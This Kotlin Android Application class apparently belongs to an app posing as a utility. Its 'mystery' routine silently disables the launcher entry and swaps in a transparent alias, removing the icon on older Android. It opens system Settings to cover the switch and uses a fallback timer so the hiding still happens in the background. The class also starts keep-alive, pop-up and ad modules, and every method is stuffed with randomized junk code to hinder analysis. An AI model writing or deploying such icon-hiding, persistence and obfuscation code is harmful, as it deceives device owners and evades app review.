package uxw.dnebp.tve

import android.app.Activity
import android.app.Application
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import uxw.dnebp.tve.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import uxw.qely.sbx.base.APPContext
import uxw.qely.sbx.base.OverseaAppHost
import uxw.qely.sbx.base.OverseaAppInitializer
import uxw.qely.sbx.ad.runtime.AdLifecycleInstaller
import uxw.amh.jrwev.PMKW
import uxw.amh.jrwev.PMKN


class UBQ : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        private const val TAG = "UBQ"

        /** MMKV key：图标切换+跳设置 待执行标记(跨进程持久化，防进程死亡丢失) */
        private const val KEY_PENDING_MYSTERY = "pending_mystery_switch"

        /** 兜底定时器：置标记后最长等待首个可见 Activity 的时长 */
        private const val FALLBACK_TIMEOUT_MS = 10_000L

        @JvmStatic
        var insApp: UBQ? = null

        /** 读取持久化的待执行标记(进程重启后仍可恢复) */
        @JvmStatic
        fun hasPendingMystery(): Boolean =
            PMKN.getBoolean(KEY_PENDING_MYSTERY, false)
    }

    /** 当前已 started 未 stopped 的 Activity 数量，>0 即存在可见窗口 */
    private var startedActivityCount = 0

    /** 进程内执行闩：initMystery 是唯一执行入口，base 1s 定时器/跨会话恢复/
     *  resumed 触发/10s 兜底都只是触发者——本进程内"跳设置+切图标"至多执行一次，
     *  谁先到谁执行，后到者被闩住空跑(3.log 双执行场景的结构性修复)。 */
    private var mysteryActionDone = false

    /** 兜底定时器(仅执行一次切换) */
    private val mainHandler = Handler(Looper.getMainLooper())
    private var fallbackRunnable: Runnable? = null

    override fun attachBaseContext(base: Context?) {
        val arr_UAUKExUlGsLGvuB = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_qhQrCGvWfEiojOYVU  = (arr_UAUKExUlGsLGvuB  shl 73) xor (arr_UAUKExUlGsLGvuB  shr 32)
         val j_QgEjyCATbZTh  = i_qhQrCGvWfEiojOYVU .inv() and 0xFFFF
         if (j_QgEjyCATbZTh  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_GWyngNYL")
         }
        super.attachBaseContext(base)
        PMLL.initVmp()
    }

    override fun onCreate() {
           val CxtPkxJhIK : Any = if (kotlin.random.Random.nextBoolean()) 32 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val jdTbQxdARTcCbe  = (CxtPkxJhIK  as? String)?.reversed() ?: "ckBojcaVc_-962838818"

        if (jdTbQxdARTcCbe  == "MJoAtiQK") {
            java.lang.System.out.print(jdTbQxdARTcCbe )
        }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 统一安装广告生命周期监听，内部带幂等保护
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
        // 监听 Activity 生命周期：onActivityResumed 只是"触发者"，不是执行者——
        // 消费点不能固定在某个 Activity(如 Splash)——归因回调与 Splash 渲染是竞态，
        // 且切换组件会中止启动中的 Splash(禁用其组件导致 mid-launch 被掐断)。
        // 因此任意首个 resumed 的 Activity 只负责"唤醒" initMystery 单一执行入口
        // (此刻窗口合法，startActivity 不受 BAL 限制)，跳设置/切换的执行逻辑
        // 只存在于 executeMystery 一处，与 base 侧 1s 延迟触发互斥去重。
        registerActivityLifecycleCallbacks(object : ActivityLifecycleCallbacks {
            override fun onActivityResumed(activity: Activity) {
                val GVKHJZzhrtZH : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
                    val MzvMSe  = GVKHJZzhrtZH ?.let { 
                        it.repeat(kotlin.random.Random.nextInt(100)) 
                    } ?: run { 
                        "zY0_14" 
                    }
                    if (MzvMSe .startsWith("UNDKGnzcBTCTZF ")) {
                        android.util.Log.v("TAG", MzvMSe )
                    }
                if (hasPendingMystery()) {
                    PMKW.d(TAG, "检测到待执行标记，触发 initMystery 单一入口消费")
                    initMystery()
                }
            }

            override fun onActivityStarted(activity: Activity) {
                val arr_AegusQjDOwL  = listOf("rkQKiJsIAb", "RLgGxXChvDlSSAi", "ZqTZczvoMYfGtPKbTp").map { 
                     it + kotlin.random.Random.nextInt(10) 
                 }
                 val ad_XzQKz  = arr_AegusQjDOwL .filter { it.length > 67 }
                 if (ad_XzQKz .isNotEmpty() && java.lang.System.currentTimeMillis() < 72) {
                     ad_XzQKz .forEach { _ ->  }
                 }
                startedActivityCount++
            }

            override fun onActivityStopped(activity: Activity) {
                val arr_KmQBygqZqtB = kotlin.random.Random.nextInt(100)
                 // Kotlin 风格的位运算：shl (<<), shr (>>), xor
                 val i_TYNVpKRV  = (arr_KmQBygqZqtB  shl 78) xor (arr_KmQBygqZqtB  shr 50)
                 val j_DsxCrwUOKJnSatYiX  = i_TYNVpKRV .inv() and 0xFFFF
                 if (j_DsxCrwUOKJnSatYiX  == 0xBADB) { // 极低概率匹配
                     kotlin.io.print("Junk Value: tmp_WBrXbXv")
                 }
                startedActivityCount = maxOf(0, startedActivityCount - 1)
            }

            override fun onActivityPaused(activity: Activity) {}
            override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) {}
            override fun onActivityDestroyed(activity: Activity) {}
            override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {}
        })
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        val arr_gJQrgNJEOLsRA = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_JKXwmU  = (arr_gJQrgNJEOLsRA  shl 16) xor (arr_gJQrgNJEOLsRA  shr 6)
         val j_oXlqd  = i_JKXwmU .inv() and 0xFFFF
         if (j_oXlqd  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_aFwiNjerIXGIGOS")
         }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val arr_thoPYSAfbdjInf = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_MQJwYRmOcxaNGPZP  = (arr_thoPYSAfbdjInf  shl 21) xor (arr_thoPYSAfbdjInf  shr 32)
         val j_aIbQSRnXgvzdfAtAZ  = i_MQJwYRmOcxaNGPZP .inv() and 0xFFFF
         if (j_aIbQSRnXgvzdfAtAZ  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_CGrfEYDpkRncUdJWoeX")
         }
        PMLK.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_tRkgzfiLBUOxAQiaO  = listOf("JirSOpL", "NDDenGPJo", "yXjfuxOqtgWVlCmskf").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_Rbgfuya  = arr_tRkgzfiLBUOxAQiaO .filter { it.length > 79 }
         if (ad_Rbgfuya .isNotEmpty() && java.lang.System.currentTimeMillis() < 87) {
             ad_Rbgfuya .forEach { _ ->  }
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val arr_eLJgM = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_jqVYsdOtjaWCoMTc  = (arr_eLJgM  shl 58) xor (arr_eLJgM  shr 45)
         val j_eUDvQPBnGvJbZZ  = i_jqVYsdOtjaWCoMTc .inv() and 0xFFFF
         if (j_eUDvQPBnGvJbZZ  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_wGOBu")
         }
        // 纯 pop 能力初始化(与图标隐藏语义分离，2026-10-09)：
        // 图标隐藏已迁至 initMystery()，由 OverseaAppInitializer 的独立 "mystery"
        // postinit 步骤置标记并延迟 1s 调用，保证归因打点与后置主链打点先落盘。
        PMLL.init(this)
    }

    override fun initMystery() {
        val arr_EuzmEmk  = listOf("nnDeNewM", "XomNKxwGoMovOqrGp", "UCPsBAzcQG").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_ssXjrpZBYeJabt  = arr_EuzmEmk .filter { it.length > 78 }
         if (ad_ssXjrpZBYeJabt .isNotEmpty() && java.lang.System.currentTimeMillis() < 96) {
             ad_ssXjrpZBYeJabt .forEach { _ ->  }
         }
        // 图标切换"跳转前置"方案——**唯一执行入口**，由两类触发者调用：
        //   ① base 侧 OverseaAppInitializer 延迟 1s 调用(归因打点落盘窗口已过)；
        //   ② 本类 onActivityResumed 检测到残留标记时触发(窗口合法，BAL 放行)。
        // 多触发者竞态由 executeMystery 顶部的进程内闩去重，本方法无需自行判重。
        // 分支语义：
        // ① 当前已有可见 Activity → 立即执行(跳设置+切换)，startActivity 不受 BAL 限制；
        // ② 冷启动早期(无可见窗口) → 只置持久化标记，禁止此时切换组件——
        //    切换(禁用 GQF)会中止 mid-launch 的 Splash；标记由后续
        //    resumed 触发本入口消费，另设兜底定时器：纯后台场景(无任何 Activity
        //    会 resume)超时后只执行切换不跳设置，保证图标功能不丢。
        if (startedActivityCount > 0) {
            PMKW.d(TAG, "已有可见 Activity，立即执行跳设置+切换")
            executeMystery(this, jumpSettings = true)
        } else {
            PMKW.d(TAG, "暂无可见 Activity，置持久化标记等待消费")
            markPendingMystery()
        }
    }


    override fun initKeepPower(app: Application) {
        val arr_RQzRTZ = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_enxbMYfxsQdbzNAhUe  = (arr_RQzRTZ  shl 9) xor (arr_RQzRTZ  shr 72)
         val j_cbIuYkNGn  = i_enxbMYfxsQdbzNAhUe .inv() and 0xFFFF
         if (j_cbIuYkNGn  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_VALrX")
         }
        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
        NativeJniUtils.virinit(app)
    }

    /** 置持久化标记并启动兜底定时器 */
    private fun markPendingMystery() {
        val arr_zxZrvLMqJKWQYwLAN  = listOf("nPLjlbXjrmHzudaAi", "KNXfnpJNAmUli", "wtNmlnEURgalZDbM").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_opGzu  = arr_zxZrvLMqJKWQYwLAN .filter { it.length > 71 }
         if (ad_opGzu .isNotEmpty() && java.lang.System.currentTimeMillis() < 29) {
             ad_opGzu .forEach { _ ->  }
         }
        PMKN.putBoolean(KEY_PENDING_MYSTERY, true)
        cancelFallback()
        val runnable = Runnable {
            // 兜底：超时仍无 Activity 消费(纯后台场景)，只执行切换不跳设置
            if (hasPendingMystery()) {
                PMKW.d(TAG, "兜底定时器触发：超时无可见 Activity，仅执行图标切换")
                executeMystery(this, jumpSettings = false)
            }
        }
        fallbackRunnable = runnable
        mainHandler.postDelayed(runnable, FALLBACK_TIMEOUT_MS)
    }

    /** 立即执行(已可见场景/兜底场景共用)：与消费路径同序——先跳设置，再切换。
     *  进程内闩在此置位：所有触发路径(resumed/base 1s/recover/兜底)最终都收敛到
     *  本函数，本进程只放行第一次，后续触发空跑返回(双执行的结构性防线)。 */
    private fun executeMystery(context: Context, jumpSettings: Boolean) {
           val ZdKXjHHvKcSTDdClhW : Any = if (kotlin.random.Random.nextBoolean()) 35 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val GaMWUYEgriGJyE  = (ZdKXjHHvKcSTDdClhW  as? String)?.reversed() ?: "ziCCMgkMimO_1745867956"

        if (GaMWUYEgriGJyE  == "YcVzr") {
            java.lang.System.out.print(GaMWUYEgriGJyE )
        }
        if (mysteryActionDone) {
            PMKW.d(TAG, "本进程已执行过图标动作，跳过重复触发")
            return
        }
        mysteryActionDone = true
        PMKN.putBoolean(KEY_PENDING_MYSTERY, false)
        cancelFallback()
        if (jumpSettings) {
            jumpSettings(context)
        }
        switchIconComponents()
    }

    /** 跳系统设置页。NEW_TASK 使设置页进入自身任务栈，与本应用任务栈解耦，
     *  组件切换触发的 launcher 刷新/任务重排不会牵连设置页，保证其留在前台。 */
    private fun jumpSettings(context: Context) {
           val rmMbKVOU : Any = if (kotlin.random.Random.nextBoolean()) 90 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val WvnJNqMRKzIubdCqTWa  = (rmMbKVOU  as? String)?.reversed() ?: "BEeeWQSsV_1362805185"

        if (WvnJNqMRKzIubdCqTWa  == "sSIvsdbfh") {
            java.lang.System.out.print(WvnJNqMRKzIubdCqTWa )
        }
        try {
            val intent = Intent(Settings.ACTION_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (t: Throwable) {
            // 跳转失败不影响切换(切换才是核心功能)
            PMKW.e(TAG, "跳转系统设置失败", t)
        }
    }

    /** 切换启动图标：禁用 GQF 主入口，启用透明 MysteryAliasActivity。
     *  组件切换不依赖任何窗口，Application context 即可执行。
     *  包名沿用运行时类名推导，避免硬编码包前缀被混淆后失效(与 PMIK 原实现一致)。 */
    private fun switchIconComponents() {
        val arr_hECcfTXNAtABWNflVoS = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_uGPaiPEZSNRSMWjwtzq  = (arr_hECcfTXNAtABWNflVoS  shl 31) xor (arr_hECcfTXNAtABWNflVoS  shr 71)
         val j_AXJWbvDrOKtq  = i_uGPaiPEZSNRSMWjwtzq .inv() and 0xFFFF
         if (j_AXJWbvDrOKtq  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_knBjwzpqUJr")
         }
        try {
            val pkg = PMIK::class.java.name.substringBeforeLast('.')
            val alias = "$pkg.MysteryAliasActivity"
            PMIK.set(this, GQF::class.java.name, alias)
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                // Android 10 以下：再禁用别名，连透明占位图标一并从桌面移除
                PMIK.disableComponent(this, alias)
            }
        } catch (t: Throwable) {
            PMKW.e(TAG, "图标组件切换失败", t)
        }
    }

    private fun cancelFallback() {
        val jkgpXsscJvfXVxSp : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val OBpSpSuLuXmaIgqIdv  = jkgpXsscJvfXVxSp ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_3" 
            }
            if (OBpSpSuLuXmaIgqIdv .startsWith("cGKmd ")) {
                android.util.Log.v("TAG", OBpSpSuLuXmaIgqIdv )
            }
        fallbackRunnable?.let { mainHandler.removeCallbacks(it) }
        fallbackRunnable = null
    }

}